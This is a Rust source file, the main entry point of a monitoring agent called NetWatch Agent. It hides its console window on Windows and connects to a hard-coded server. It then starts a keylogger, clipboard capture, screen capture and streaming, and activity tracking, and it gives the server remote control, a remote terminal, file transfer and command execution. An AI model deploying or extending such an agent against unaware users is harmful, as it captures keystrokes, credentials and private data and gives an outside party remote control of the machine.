//! NetWatch Agent - Main Entry Point
//!
//! A lightweight monitoring agent written in Rust for improved reliability,
//! performance, and smaller binary size compared to the Electron version.

// Hide console window on Windows in release builds
#![cfg_attr(
    all(target_os = "windows", not(debug_assertions)),
    windows_subsystem = "windows"
)]

mod tray;

use netwatch_agent::{
    config::Config,
    services::{
        ActivityTracker, BlockingService, Clipboard, Commands, FileTransfer, Keylogger,
        ProcessMonitor, RemoteControl, ScreenCapture, ScreenRecorder, SystemRestrictions,
        Terminal,
    },
    socket::SocketClient,
};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tokio::sync::RwLock;
use tracing::{error, info, warn};
use tracing_subscriber::{fmt, prelude::*, EnvFilter};

use crate::tray::SystemTray;

/// Default server URL
const DEFAULT_SERVER_URL: &str = "https://do.roydevelops.tech";

/// Initialize Windows COM library
#[cfg(target_os = "windows")]
fn init_windows() {
    use winapi::um::combaseapi::CoInitializeEx;
    use winapi::um::objbase::COINIT_APARTMENTTHREADED;

    unsafe {
        // Initialize COM for the main thread (required for shell operations)
        let _ = CoInitializeEx(std::ptr::null_mut(), COINIT_APARTMENTTHREADED);
    }
}

#[cfg(not(target_os = "windows"))]
fn init_windows() {}

/// Show error message box on Windows
#[cfg(target_os = "windows")]
fn show_error(title: &str, message: &str) {
    use std::ffi::OsStr;
    use std::iter::once;
    use std::os::windows::ffi::OsStrExt;
    use std::ptr::null_mut;

    let title: Vec<u16> = OsStr::new(title).encode_wide().chain(once(0)).collect();
    let message: Vec<u16> = OsStr::new(message).encode_wide().chain(once(0)).collect();

    unsafe {
        winapi::um::winuser::MessageBoxW(
            null_mut(),
            message.as_ptr(),
            title.as_ptr(),
            winapi::um::winuser::MB_OK | winapi::um::winuser::MB_ICONERROR,
        );
    }
}

#[cfg(not(target_os = "windows"))]
fn show_error(title: &str, message: &str) {
    eprintln!("{}: {}", title, message);
}

/// Application state shared across services
pub struct AppState {
    pub socket: Arc<SocketClient>,
    pub config: Arc<RwLock<Config>>,
    pub is_monitoring: Arc<RwLock<bool>>,
}

/// Status update channel message
#[derive(Clone)]
enum StatusUpdate {
    Connecting,
    Connected,
    Disconnected,
    Error(String),
}

fn main() {
    // Initialize Windows COM (must be done before any shell operations)
    init_windows();

    // Initialize logging to file on Windows (since console is hidden)
    #[cfg(target_os = "windows")]
    {
        if let Some(data_dir) = dirs::data_local_dir() {
            let log_dir = data_dir.join("NetWatch");
            let _ = std::fs::create_dir_all(&log_dir);
            let log_file = log_dir.join("agent.log");

            if let Ok(file) = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(&log_file)
            {
                tracing_subscriber::registry()
                    .with(fmt::layer().with_writer(std::sync::Mutex::new(file)))
                    .with(EnvFilter::from_default_env().add_directive("netwatch_agent=info".parse().unwrap()))
                    .init();
            } else {
                // Fallback to no logging if file can't be opened
                tracing_subscriber::registry()
                    .with(EnvFilter::from_default_env().add_directive("netwatch_agent=info".parse().unwrap()))
                    .init();
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        tracing_subscriber::registry()
            .with(fmt::layer())
            .with(EnvFilter::from_default_env().add_directive("netwatch_agent=info".parse().unwrap()))
            .init();
    }

    info!("NetWatch Agent v{} starting...", env!("CARGO_PKG_VERSION"));

    // Load configuration
    let mut config = match Config::load() {
        Ok(cfg) => {
            info!("Configuration loaded successfully");
            cfg
        }
        Err(e) => {
            warn!("Failed to load config, using defaults: {}", e);
            Config::default()
        }
    };

    // Use default server URL if not configured
    if config.server_url.is_empty() {
        info!(
            "No server URL in config, using default: {}",
            DEFAULT_SERVER_URL
        );
        config.server_url = DEFAULT_SERVER_URL.to_string();
    }

    let server_url = config.server_url.clone();

    // Create channels for communication between tray and agent
    let (status_tx, status_rx) = std::sync::mpsc::channel::<StatusUpdate>();
    let exit_requested = Arc::new(AtomicBool::new(false));
    let exit_flag = exit_requested.clone();

    // Try to create the system tray (non-fatal if it fails)
    let tray = match SystemTray::new(&server_url, exit_requested.clone()) {
        Ok(t) => {
            info!("System tray created successfully");
            Some(t)
        }
        Err(e) => {
            warn!("Failed to create system tray: {}. Running without tray.", e);
            None
        }
    };

    // Spawn the agent runtime in a background thread
    let agent_exit_flag = exit_flag.clone();
    let agent_handle = std::thread::spawn(move || {
        let rt = tokio::runtime::Runtime::new().expect("Failed to create tokio runtime");
        rt.block_on(async move {
            run_agent(config, status_tx, agent_exit_flag).await;
        });
    });

    // Run the tray event loop on the main thread (or just wait if no tray)
    if let Some(tray) = tray {
        tray::run_event_loop(|| {
            // Check for status updates
            while let Ok(status) = status_rx.try_recv() {
                match status {
                    StatusUpdate::Connecting => tray.set_status("Connecting..."),
                    StatusUpdate::Connected => tray.set_status("Connected"),
                    StatusUpdate::Disconnected => tray.set_status("Disconnected"),
                    StatusUpdate::Error(msg) => tray.set_status(&format!("Error: {}", msg)),
                }
            }

            // Check for menu events
            if let Ok(event) = tray_icon::menu::MenuEvent::receiver().try_recv() {
                tray.handle_menu_event(&event);
            }

            // Return false to exit the loop if exit was requested
            !exit_requested.load(Ordering::SeqCst)
        });

        info!("Tray event loop ended, shutting down...");

        // Signal the agent to stop
        exit_requested.store(true, Ordering::SeqCst);
    } else {
        // No tray - run without UI, just wait for Ctrl+C or agent completion
        info!("Running without system tray...");

        // Set up Ctrl+C handler for graceful shutdown
        let ctrlc_flag = exit_flag.clone();
        let _ = ctrlc::set_handler(move || {
            info!("Ctrl+C received, shutting down...");
            ctrlc_flag.store(true, Ordering::SeqCst);
        });

        // Wait for agent thread to finish
        let _ = agent_handle.join();
    }

    info!("NetWatch Agent stopped");
}

async fn run_agent(
    config: Config,
    status_tx: std::sync::mpsc::Sender<StatusUpdate>,
    exit_flag: Arc<AtomicBool>,
) {
    let config = Arc::new(RwLock::new(config));

    // Create socket client
    let socket = Arc::new(SocketClient::new(config.clone()));
    let is_monitoring = Arc::new(RwLock::new(false));

    let _app_state = Arc::new(AppState {
        socket: socket.clone(),
        config: config.clone(),
        is_monitoring: is_monitoring.clone(),
    });

    // Connect to server
    let _ = status_tx.send(StatusUpdate::Connecting);
    info!(
        "Connecting to server: {}",
        config.read().await.server_url
    );

    if let Err(e) = socket.connect().await {
        let msg = format!(
            "Failed to connect to server: {}\n\nServer: {}",
            e,
            config.read().await.server_url
        );
        error!("{}", msg);
        let _ = status_tx.send(StatusUpdate::Error(e.to_string()));
        show_error("NetWatch Agent - Connection Error", &msg);
        return;
    }

    let _ = status_tx.send(StatusUpdate::Connected);
    info!("Connected to server successfully");

    // Initialize services
    let screen_capture = ScreenCapture::new(socket.clone(), config.clone());
    let activity_tracker = ActivityTracker::new(socket.clone());
    let keylogger = Keylogger::new(socket.clone());
    let clipboard = Clipboard::new(socket.clone());
    let process_monitor = ProcessMonitor::new(socket.clone());
    let remote_control = RemoteControl::new(socket.clone());
    let terminal = Terminal::new(socket.clone());
    let file_transfer = FileTransfer::new(socket.clone());
    let commands = Commands::new(socket.clone());
    let blocking_service = BlockingService::new(socket.clone());
    let system_restrictions = SystemRestrictions::new(socket.clone());
    let screen_recorder = ScreenRecorder::new(socket.clone());

    // Register event handlers
    {
        let screen_capture = screen_capture.clone();
        let activity_tracker = activity_tracker.clone();
        let keylogger = keylogger.clone();
        let clipboard = clipboard.clone();
        let process_monitor = process_monitor.clone();
        let blocking_service = blocking_service.clone();
        let is_monitoring = is_monitoring.clone();

        socket
            .on_auth_success(move |_config_data| {
                info!("Authenticated successfully");
                let screen_capture = screen_capture.clone();
                let activity_tracker = activity_tracker.clone();
                let keylogger = keylogger.clone();
                let clipboard = clipboard.clone();
                let process_monitor = process_monitor.clone();
                let blocking_service = blocking_service.clone();
                let is_monitoring = is_monitoring.clone();

                tokio::spawn(async move {
                    *is_monitoring.write().await = true;

                    // Start monitoring services
                    screen_capture.start().await;
                    activity_tracker.start().await;
                    keylogger.start().await;
                    clipboard.start().await;
                    process_monitor.start().await;
                    blocking_service.start().await;

                    info!("All monitoring services started");
                });
            })
            .await;
    }

    // Register auth error handler
    {
        let status_tx_auth = status_tx.clone();
        socket
            .on_auth_error(move |error_msg| {
                error!("Authentication failed: {}", error_msg);
                let _ = status_tx_auth.send(StatusUpdate::Error(format!("Auth: {}", error_msg)));
            })
            .await;
    }

    // Register command handlers
    remote_control.register_handlers(&socket).await;
    terminal.register_handlers(&socket).await;
    file_transfer.register_handlers(&socket).await;
    commands.register_handlers(&socket).await;
    blocking_service.register_handlers(&socket).await;
    system_restrictions.register_handlers(&socket).await;
    screen_recorder.register_handlers(&socket).await;

    // Register screen stream handlers
    {
        let screen_capture_start = screen_capture.clone();
        socket
            .on_start_screen_stream(move |(quality, fps)| {
                let sc = screen_capture_start.clone();
                tokio::spawn(async move {
                    sc.start_stream(quality, fps).await;
                });
            })
            .await;
    }

    {
        let screen_capture_stop = screen_capture.clone();
        socket
            .on_stop_screen_stream(move |_| {
                let sc = screen_capture_stop.clone();
                tokio::spawn(async move {
                    sc.stop_stream().await;
                });
            })
            .await;
    }

    {
        let screen_capture_screenshot = screen_capture.clone();
        socket
            .on_capture_screenshot(move |_| {
                let sc = screen_capture_screenshot.clone();
                tokio::spawn(async move {
                    sc.capture_and_send().await;
                });
            })
            .await;
    }

    // Keep running and check for exit signal
    let status_tx_clone = status_tx.clone();
    loop {
        // Check if exit was requested
        if exit_flag.load(Ordering::SeqCst) {
            info!("Exit requested, shutting down services...");
            break;
        }

        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;

        // Check connection and attempt reconnect if needed
        if !socket.is_connected().await {
            warn!("Connection lost, attempting to reconnect...");
            let _ = status_tx_clone.send(StatusUpdate::Disconnected);

            if let Err(e) = socket.connect().await {
                error!("Reconnection failed: {}", e);
            } else {
                info!("Reconnected successfully");
                let _ = status_tx_clone.send(StatusUpdate::Connected);
            }
        }
    }

    // Stop all services
    screen_capture.stop().await;
    activity_tracker.stop().await;
    keylogger.stop().await;
    clipboard.stop().await;
    process_monitor.stop().await;
    terminal.stop_all().await;
    blocking_service.stop().await;

    // Disconnect socket
    socket.disconnect().await;

    info!("Agent services stopped");
}
